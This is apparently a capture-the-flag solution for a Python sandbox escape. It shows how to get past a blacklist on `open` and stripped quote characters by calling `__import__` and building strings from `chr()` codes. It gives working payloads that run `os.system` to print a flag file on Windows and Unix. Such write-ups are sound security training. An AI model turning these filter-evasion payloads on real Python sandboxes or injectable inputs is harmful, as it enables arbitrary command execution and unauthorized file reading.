# Solution
You have access to global variables (see `g`), just `open` is blacklisted.

That means you can import stuff using `__import__`.

Since `"` and `'` are replaced from the input with an empty string, you need to create your string using `chr(ascii)`

The following executes a system command to print the contents of the file.
##### Windows: 
```py
__import__("os").system("type flag")
# encoded:
__import__(str().join(map(chr, [0x6F, 0x73]))).system(str().join(map(chr, [0x74, 0x79, 0x70, 0x65, 0x20, 0x66, 0x6C, 0x61, 0x67])))
```
##### Unix:
```py
__import__("os").system("cat flag")
# encoded:
__import__(str().join(map(chr, [0x6F, 0x73]))).system(str().join(map(chr, [0x63, 0x61, 0x74, 0x20, 0x66, 0x6C, 0x61, 0x67])))
```
